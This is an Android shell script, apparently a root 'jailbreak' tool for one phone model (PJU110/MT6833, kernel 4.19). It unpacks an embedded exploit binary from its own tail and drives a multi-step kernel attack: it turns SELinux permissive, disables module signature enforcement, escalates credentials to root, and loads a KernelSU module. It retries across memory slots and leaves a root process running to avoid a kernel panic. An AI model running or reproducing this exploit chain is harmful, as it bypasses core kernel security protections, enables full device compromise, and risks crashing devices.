#!/system/bin/sh
# ============================================================
#  KernelSU 3.3.1 · 越狱 v5.10（单文件 / 完全自包含）
#  PJU110 / MT6833 / 4.19.191+ / Android 14
#
#  sh /data/local/tmp/ksu          越狱
#  sh /data/local/tmp/ksu check    只看状态，不写入
#  sh /data/local/tmp/ksu clean    清理上次运行的日志与中间文件
#  sh /data/local/tmp/ksu relax    应急：仅切 SELinux 为宽容
#
#  v5.10 相对 v5.9
#    · 计时改用 /proc/uptime（单调），不再用 date +%s%N
#      v5.9 的 "释放载荷 · -902 ms" 就是它造成的：开机初期时钟跳变
#    · 各步耗时显示到 0.1 秒（3.4 秒，不再取整成 3 秒）
#    · 释放载荷先打印提示再干活，不再有半秒空白
#    · 未知参数给出提示，不再默默去跑 exploit
#    · 失败时把日志末两行直接打出来，不用再手翻 k1.log
#
#  v5.10 修掉的两个 v5.9 真 bug（不只是显示）
#    · 第 2 步的失败关键词 'STILL-' 永远不会出现（sig_enforce 栏拒绝时
#      写的是 VERDICT(sig_enforce): ... (unchanged)），导致提前放弃失效，
#      失败时白等满上限。现在统一用 BAD_RE 匹配 4 类终止判决。
#    · 超时按"循环次数"算，而 sleep 0.1 实测 118ms，
#      导致写 300 次的 30 秒变成 35 秒、600 次的 60 秒变成 71 秒
#      （就是你上次那两行 151 点 / 285 点的来源）。现在按真实毫秒算。
#    · 新增判据：本次派生的 exploit 已退出且目标未达成，宽限 1.5 秒后
#      直接判失败（不再依赖日志关键词，也不受上次常驻进程干扰）
#    · reap / clean_stale 只杀 uid!=0 的进程，绝不碰提权成功留下的
#      uid=0 常驻进程（杀它会让 init_cred 引用计数归零 -> 内核 panic）
#
#  v5.9
#    · 未命中不再干等到上限：轮询中每 0.5 秒扫日志，
#      见到 STILL- / NOT-ROOT 立刻换槽位（省掉过 105 秒空等）
#    · 输出恢复单行排版，点每秒最多一个
#
#  v5.8 / v5.7 / v5.6（保留）
#    · 标题最先打印；命中后不 reap；read 内建轮询；管理器后台派发
#    · v5.6 修复：按目标状态轮询，不再空等 "SHM verdict" 15 秒
#
#  注意
#    · 只在本次开机内有效，真重启后需重跑
#    · 提权后会留一个常驻进程，那是刻意保留的，杀掉会导致内核崩溃
# ============================================================

TMP=/data/local/tmp
DL=/sdcard/Download
PKG=me.weishu.kernelsu
GL=$TMP/gl_v112
KO=$DL/ksu_raw.ko
SO=$DL/libksud.so
AL=$DL/allowlist.bin
LEDGER=$TMP/.ksu_slots
LOG=$DL/ksu_last.log
SELF=$0

# 载荷起始偏移（构建时写入，勿改）
PAYLOAD_OFFSET=17573

NL='
'
LOGBUF=
MODE=$1

# 毫秒时钟：读 /proc/uptime（单调、不受 NTP 影响、不 fork）
# 内核格式固定为 "秒.两位小数"（%lu.%02lu）
now_ms() {
    read -r _u _xx < /proc/uptime
    case "$_u" in
        *.*) _i=${_u%.*}; _d=${_u#*.} ;;
        *)   _i=$_u; _d=0 ;;
    esac
    # 兼容 _d 只有 1 位的情况，避免把 380.9 算成 380090
    [ ${#_d} = 1 ] && _d="${_d}0"
    echo $(( _i * 1000 + _d * 10 ))
}
_START=$(now_ms)
el()   { echo $(( ( $(now_ms) - _START ) / 1000 )); }
# 毫秒 -> "3.4"（一位小数的秒）
sec1() { echo "$(( $1 / 1000 )).$(( ($1 % 1000) / 100 ))"; }

# 失败判决关键词：只在 exploit 真正给出结论时才出现，避免被中途的安全提示误判
#   STILL-ENFORCING / STILL-RESTRICTED / STILL-PANICS  链没打通
#   VERDICT(...) -> (unchanged)                        目标值没变
#   REFUSE: xxx                                        链条被拒
#   NOT-ROOT                                           提权没成
BAD_RE='STILL-|unchanged|NOT-ROOT|REFUSE:'

buf() { LOGBUF="$LOGBUF$*$NL"; }
# 屏幕立即输出；文件写入推迟到收尾（单次写 /sdcard 实测 26ms）
log() { printf '  %s\n' "$*"; LOGBUF="$LOGBUF$*$NL"; }
bar() { printf '  --------------------------------\n'; }
flush_log() {
    [ -z "$LOGBUF" ] && return 0
    [ -w "$DL" ] 2>/dev/null || LOG=$TMP/ksu_last.log
    printf '%s' "$LOGBUF" >> "$LOG" 2>/dev/null
    LOGBUF=
}
die() { log "中止: $*"; printf '\n'; flush_log; exit 1; }

# 打印某步日志的最后几行（失败时用，省得再手翻 k1.log）
taillog() {
    [ -e "$1" ] || return 0
    _r=$(grep -E "$BAD_RE|says ROOT|errno=|FAIL|EPERM|denied" "$1" 2>/dev/null | tail -2)
    [ -z "$_r" ] && return 0
    _oIFS=$IFS; IFS=$NL
    for _l in $_r; do IFS=$_oIFS; log "    $_l"; IFS=$NL; done
    IFS=$_oIFS
    return 0
}

# 标题最先输出，不先做任何 fork
printf '\n'
log "KernelSU 越狱 · v5.10（单文件自包含）"

sg_now()      { cat /sys/module/module/parameters/sig_enforce 2>/dev/null; }
enforce_now() { cat /sys/fs/selinux/enforce 2>/dev/null; }
mod_loaded()  { [ -d /sys/module/kernelsu ]; }

_s=$(sg_now); [ -n "$_s" ] || _s="?"
log "$(date '+%Y-%m-%d %H:%M:%S')  ·  enforce=$(enforce_now)  sig=$_s"
bar

case "$MODE" in
    ''|run|check|clean|relax) ;;
    *)
        log "未知参数: $MODE"
        log "可用: 空(越狱)  check  clean  relax"
        bar
        printf '\n'
        exit 2
        ;;
esac

# 等一步的结果，按真实毫秒算上限。
#   $1=类型(enforce/sig/mod)  $2=期望值  $3=超时毫秒  $4=本步日志路径
# 返回 0=命中  1=未命中
# 每 4 次（约 0.5 秒）扫一次日志，见到失败判决立刻返回，不等满上限
# 按真实时间轮询，命中或出现失败判决就返回
prog_run() {
    _type=$1; _want=$2; _ms=$3; _logx=$4; _pid=$5
    # 按真实时间算上限：sleep 0.1 实测 118ms，按次数算会把 30 秒放大成 35 秒
    _end=$(( $(now_ms) + _ms ))
    _n=0
    _gone=0; _gone_at=0
    while [ $_n -lt 9000 ]; do
        case $_type in
            enforce)
                _v=
                { read -r _v < /sys/fs/selinux/enforce; } 2>/dev/null
                [ "$_v" = "$_want" ] && return 0
                ;;
            sig)
                _v=
                { read -r _v < /sys/module/module/parameters/sig_enforce; } 2>/dev/null
                [ "$_v" = "$_want" ] && return 0
                ;;
            mod)
                [ -d /sys/module/kernelsu ] && return 0
                ;;
        esac

        # 每轮都查时间：now_ms 实测 2.6ms/次，相对 sleep 0.1（118ms）可忽略
        [ "$(now_ms)" -ge "$_end" ] && return 1

        # 判据一（不看日志）：本次派生的 exploit 已退出，目标却还没到 -> 失败
        # 只看自己抓到的 _pid：不能用 pidof gl_v112，否则上次提权留下的
        # uid=0 常驻进程会让这条判据永远不触发
        # 宽限 1.5 秒，防止它先 fork 再退出造成误判
        if [ "$_gone" = 0 ] && [ $(( _n % 4 )) = 0 ]; then
            if [ -n "$_pid" ] && kill -0 "$_pid" 2>/dev/null; then
                :
            else
                # 主进程没了，再确认没有 uid!=0 的 gl_v112 还在干活
                # （排除 uid=0 常驻进程，避免它把判据永久卡住）
                _live=$(ps -A -o PID,UID,NAME 2>/dev/null | awk '$3 ~ /gl_v112/ && $2 != 0' | head -1)
                [ -z "$_live" ] && { _gone=1; _gone_at=$(now_ms); }
            fi
        fi
        if [ "$_gone" = 1 ] && [ $(( $(now_ms) - _gone_at )) -ge 1500 ]; then
            return 1
        fi

        # 判据二：日志里出现终止性判决（STILL- / unchanged / NOT-ROOT / REFUSE:）
        if [ $(( _n % 4 )) = 0 ] && [ -e "$_logx" ]; then
            grep -qE -- "$BAD_RE" "$_logx" 2>/dev/null && return 1
        fi

        sleep 0.1
        _n=$((_n+1))
        [ $(( _n % 10 )) = 0 ] && printf '.'
    done
    return 1
}

# 收掉本轮遗留的 gl_v112（未命中时它可能还占着内核锁，不清会拖累下一轮）
# 安全关键：只杀 uid=2000（shell，说明提权失败的进程）。
# 提权成功后会留一个 uid=0 的常驻进程，那是刻意保留的 ——
# 杀掉它会让 init_cred 引用计数归零，直接内核 panic。
reap() {
    [ -z "$(pidof gl_v112 2>/dev/null)" ] && return 0
    _p=$(ps -A -o PID,UID,NAME 2>/dev/null | awk '$3 ~ /gl_v112/ && $2 != 0 {print $1}')
    [ -z "$_p" ] && return 0
    for _x in $_p; do kill -9 "$_x" 2>/dev/null; done
    sleep 0.2
    return 0
}

BID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null); [ -n "$BID" ] || BID=unknown
[ "$(head -1 "$LEDGER" 2>/dev/null)" = "$BID" ] || echo "$BID" > "$LEDGER" 2>/dev/null
slot_used() { grep -qx "$1" "$LEDGER" 2>/dev/null; }
slot_take() { echo "$1" >> "$LEDGER" 2>/dev/null; echo "$1"; }
slot_for() {
    case "$1" in
        sig)     PREF="0x340 0x640 0x100 0x140 0x700 0x780" ;;
        selinux) PREF="0x240 0x440 0x0c0 0x040 0x6c0 0x740" ;;
        cred)    PREF="0x680 0x700 0x740 0x6c0 0x780 0x540" ;;
        *)       PREF="0x680 0x700 0x740" ;;
    esac
    for s in $PREF; do
        slot_used "$s" || { slot_take "$s"; return 0; }
    done
    return 1
}

clean_run() {
    for _f in k1.log k2.log k2b.log k4.log ksu_work.log gl_root_proof.txt v70i_0.log; do
        [ -e "$TMP/$_f" ] || continue
        rm -f "$TMP/$_f" 2>/dev/null
    done
    rm -rf "$TMP/.ksu_unpack" 2>/dev/null
    rm -f "$LOG" 2>/dev/null
    return 0
}

# 运行收尾：删掉释放出来的 4 个载荷（下次运行会从自身尾部重新解出）
clean_payload() {
    rm -f "$GL" 2>/dev/null
    rm -f "$KO" "$SO" "$AL" 2>/dev/null
    return 0
}

# 先用 pidof 探（23ms），确实有遗留才走 ps+awk（115ms）
# 同样只清 uid!=0 的进程，保住上次提权留下的常驻进程
clean_stale() {
    [ -z "$(pidof gl_v112 2>/dev/null)" ] && return 0
    _pids=$(ps -A -o PID,UID,PPID,NAME 2>/dev/null | awk '$4 ~ /gl_v112/ && $3==1 && $2 != 0 {print $1}')
    [ -z "$_pids" ] && return 0
    _n=0
    for _p in $_pids; do
        kill -9 "$_p" 2>/dev/null && _n=$((_n+1))
    done
    [ "$_n" -gt 0 ] && log "已清理上次遗留的 gl_v112 进程 $_n 个"
    sleep 0.5
    return 0
}

unpack() {
    printf '  释放载荷 10.5MB ...'
    _u0=$(now_ms)
    _d=$TMP/.ksu_unpack
    rm -rf "$_d"
    if ! mkdir -p "$_d" 2>/dev/null; then
        printf ' 失败\n'; buf "释放载荷 10.5MB · 失败（建目录）"; return 1
    fi
    tail -c "+$PAYLOAD_OFFSET" "$SELF" 2>/dev/null | gzip -d 2>/dev/null | tar x -C "$_d" 2>/dev/null
    if [ ! -s "$_d/lt/gl_v112" ]; then
        rm -rf "$_d"; printf ' 失败\n'; buf "释放载荷 10.5MB · 失败（解压出错）"; return 1
    fi
    if ! cp -f "$_d/lt/gl_v112" "$GL" 2>/dev/null; then
        rm -rf "$_d"; printf ' 失败\n'; buf "释放载荷 10.5MB · 失败（写 gl_v112）"; return 1
    fi
    chmod 755 "$GL"
    _n=0
    for _f in ksu_raw.ko libksud.so allowlist.bin; do
        cp -f "$_d/dl/$_f" "$DL/$_f" 2>/dev/null && chmod 644 "$DL/$_f" 2>/dev/null && _n=$((_n+1))
    done
    rm -rf "$_d"
    _ms=$(( $(now_ms) - _u0 ))
    [ "$_ms" -lt 0 ] && _ms=0
    printf ' %d ms\n' "$_ms"
    if [ "$_n" = 3 ]; then
        buf "释放载荷 10.5MB · ${_ms} ms"
        return 0
    fi
    buf "释放载荷 10.5MB · ${_ms} ms（载荷不完整 $_n/3）"
    return 1
}

open_manager() {
    am force-stop "$PKG" >/dev/null 2>&1
    sleep 0.2
    _act=$(cmd package resolve-activity --brief "$PKG" 2>/dev/null | tail -1)
    if [ -n "$_act" ]; then am start -n "$_act" >/dev/null 2>&1 && return 0; fi
    monkey -p "$PKG" -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1
}

# ---------- check ----------
if [ "$MODE" = check ]; then
    if mod_loaded; then log "内核模块: 已加载"; else log "内核模块: 未加载"; fi
    log "载荷: 内嵌 4 个（每次运行重新释放，不依赖外部文件）"
    _d=$(grep -v "^$BID" "$LEDGER" 2>/dev/null | tr '\n' ' ')
    [ -n "$_d" ] && log "本开机已用槽位: $_d" || log "本开机已用槽位: 无"
    _k=$(ps -A -o PID,UID,PPID,NAME 2>/dev/null | awk '$4 ~ /gl_v112/ && $3==1 && $2==0 {print $1}' | tr '\n' ' ')
    [ -n "$_k" ] && log "常驻 gl_v112 进程: $_k（刻意保留，勿杀）"
    bar
    LOGBUF=''
    exit 0
fi

# ---------- clean ----------
if [ "$MODE" = clean ]; then
    clean_run
    clean_payload
    log "已清理本次运行产物（日志 + 临时目录 + 4 个载荷）"
    log "保留: 槽位台账 .ksu_slots"
    bar
    printf '\n'
    exit 0
fi

unpack || die "载荷释放失败（检查 /sdcard 空间）"
cd "$TMP" 2>/dev/null || die "无法进入 $TMP"

# ---------- relax ----------
if [ "$MODE" = relax ]; then
    _ok=0
    for _try in 1 2 3; do
        [ "$(enforce_now)" = 0 ] && { _ok=1; break; }
        S=$(slot_for selinux) || die "selinux 槽位用尽，先重启"
        log "SELinux → 宽容 · 槽位 $S · 第 $_try 次"
        rm -f k1.log
        _t=$(now_ms)
        ./gl_v112 selinux "$S" >k1.log 2>&1 & _gp=$!
        printf '  '
        if prog_run enforce 0 12000 "$TMP/k1.log" "$_gp"; then
            printf '\n'; log "已切宽容 · $(sec1 $(( $(now_ms) - _t ))) 秒"
            _ok=1; break
        fi
        printf '\n'; reap
    done
    if [ "$_ok" = 1 ]; then printf '\n'; flush_log; exit 0; fi
    die "切宽容失败（见 k1.log）"
fi

# ---------- 主流程 ----------
if mod_loaded; then
    log "内核模块已加载，跳过利用"
else
    clean_stale

    # 1) SELinux → 宽容
    #    硬依赖：严格模式下 sig_enforce 读不出来（Permission denied），
    #    所以这一步必须先完成，无法与第 2 步并行。
    _ok=0
    for _try in 1 2 3; do
        if [ "$(enforce_now)" = 0 ]; then
            [ "$_try" = 1 ] && log "1/5 SELinux 已是宽容，跳过"
            _ok=1; break
        fi
        S=$(slot_for selinux) || { log "1/5 selinux 槽位用尽，只能重启"; break; }
        rm -f k1.log
        _t=$(now_ms)
        ./gl_v112 selinux "$S" >k1.log 2>&1 & _gp=$!
        printf '  '
        if prog_run enforce 0 12000 "$TMP/k1.log" "$_gp"; then
            printf '\n'
            log "1/5 SELinux → 宽容 · 槽位 $S · 第 $_try 次命中 · $(sec1 $(( $(now_ms) - _t ))) 秒"
            _ok=1; break
        fi
        printf '\n'
        reap
        log "1/5 槽位 $S 未命中 · $(sec1 $(( $(now_ms) - _t ))) 秒"
        taillog "$TMP/k1.log"
    done
    [ "$_ok" = 1 ] || die "1/5 三次都没命中，可再运行一次脚本"

    # 2) 关闭模块签名校验
    _ok=0
    for _try in 1 2 3; do
        if [ "$(sg_now)" = N ]; then
            [ "$_try" = 1 ] && log "2/5 签名校验已是 N，跳过"
            _ok=1; break
        fi
        S=$(slot_for sig) || { log "2/5 sig 槽位用尽，只能重启"; break; }
        rm -f k2.log
        _t=$(now_ms)
        ./gl_v112 sig "$S" >k2.log 2>&1 & _gp=$!
        printf '  '
        if prog_run sig N 12000 "$TMP/k2.log" "$_gp"; then
            printf '\n'
            log "2/5 关闭签名校验 · 槽位 $S · 第 $_try 次命中 · $(sec1 $(( $(now_ms) - _t ))) 秒"
            _ok=1; break
        fi
        printf '\n'
        reap
        log "2/5 槽位 $S 未命中 · $(sec1 $(( $(now_ms) - _t ))) 秒"
        taillog "$TMP/k2.log"
    done
    [ "$_ok" = 1 ] || die "2/5 三次都没命中，可再运行一次脚本"

    # 3) 确认（不确认就不 insmod，否则会 Oops 重启）
    if [ "$(sg_now)" = N ]; then
        log "3/5 确认 sig_enforce=N · 通过"
    else
        log "3/5 签名校验未关闭（sig=$(sg_now)）"
        die "已中止：不做 insmod 就不会触发重启，重新运行即可"
    fi

    # 4) 提权 + 加载模块
    _ok=0
    for _try in 1 2 3 4; do
        S=$(slot_for cred) || { log "4/5 cred 槽位已用尽，只能重启"; break; }
        rm -f "$TMP/ksu_work.log" k4.log
        _t=$(now_ms)
        ./gl_v112 run x "$S" >k4.log 2>&1 & _gp=$!
        printf '  '
        if prog_run mod - 25000 "$TMP/k4.log" "$_gp"; then
            printf '\n'
            log "4/5 提权 + 加载模块 · 槽位 $S · 第 $_try 次命中 · $(sec1 $(( $(now_ms) - _t ))) 秒"
            _ok=1; break
        fi
        printf '\n'
        reap
        log "4/5 槽位 $S 未命中 · $(sec1 $(( $(now_ms) - _t ))) 秒"
        taillog "$TMP/k4.log"
    done
    if [ "$_ok" = 0 ]; then
        log "4/5 四次都没命中"
        log "SELinux 仍是宽容状态；可再运行一次脚本（cred 还剩备选槽位）"
        die "已中止"
    fi

    # 5) 模块自行恢复严格模式
    #    同样是按真实时间等（sleep 0.1 实测 118ms，按次数会拖成 12 秒）
    _t5=$(now_ms); _lim=$(( _t5 + 10000 ))
    while [ "$(now_ms)" -lt "$_lim" ]; do
        [ "$(enforce_now)" = 1 ] && break
        sleep 0.1
    done
    if [ "$(enforce_now)" = 1 ]; then
        log "5/5 恢复严格模式 · 通过 · $(sec1 $(( $(now_ms) - _t5 ))) 秒"
    else
        log "5/5 仍是 enforce=$(enforce_now)，模块未收尾（稍后复查）"
    fi
fi

bar
if ! mod_loaded; then
    log "结果: 失败 · 日志已保留在 $TMP/k*.log"
    printf '\n'
    flush_log
    clean_payload
    exit 30
fi

# 先后台派发管理器（约 20ms 返回），再打印结论，屏幕不被 am start 拖住
( open_manager ) >/dev/null 2>&1 &
TOTAL=$(el)
log "结果: 越狱成功 · 总耗时 $TOTAL 秒"
log "已打开管理器（若无响应请手动点开）"
printf '\n'
flush_log
clean_run
clean_payload
exit 0

# ============================================================
#  以下为二进制载荷，勿手动编辑
# ============================================================
